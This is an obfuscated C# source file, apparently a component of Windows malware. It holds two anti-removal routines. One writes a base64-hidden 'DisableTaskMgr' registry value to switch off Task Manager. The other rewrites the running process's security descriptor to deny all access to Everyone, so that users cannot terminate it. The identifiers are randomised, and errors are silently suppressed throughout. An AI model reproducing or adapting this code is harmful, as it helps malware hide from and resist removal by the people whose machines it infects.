using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace YzTymtbtgFABHvJvj;

internal class RxFJqSbhHcd
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr lbcCBhEEZvJzxqZ, int temoixkLwxwxm, [Out] byte[] uMnOAjhuOg, uint ENmhOWHEtHk, out uint StXSsdcbRN);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr UszZbQcxXaD, int WgNJfNTqgkHe, [In] byte[] vusckkMnUXonOH);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void oUyyOuPtzVaXRpIE(bool ApCvDRSfYgD)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.tvWunvyFIKOf("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVmchdHdm92U")));
			registryKey.SetValue(eqCksjvMyn.joRKfFeYni("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor VerIbCONKlYfqD(IntPtr fZQSEUnlXqyGUYa)
	{
		byte[] uMnOAjhuOg = new byte[0];
		GetKernelObjectSecurity(fZQSEUnlXqyGUYa, 4, uMnOAjhuOg, 0u, out var StXSsdcbRN);
		if ((long)StXSsdcbRN > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(fZQSEUnlXqyGUYa, 4, uMnOAjhuOg = new byte[StXSsdcbRN], StXSsdcbRN, out StXSsdcbRN))
		{
			return null;
		}
		return new RawSecurityDescriptor(uMnOAjhuOg, 0);
	}

	private void SRaxPTyzsekx(IntPtr eNUOfmCDbxpO, RawSecurityDescriptor xiGszRffVJdDUx)
	{
		byte[] array = new byte[xiGszRffVJdDUx.BinaryLength];
		xiGszRffVJdDUx.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(eNUOfmCDbxpO, 4, array);
	}

	public void IJzogCmMrhTJz()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = VerIbCONKlYfqD(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			SRaxPTyzsekx(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
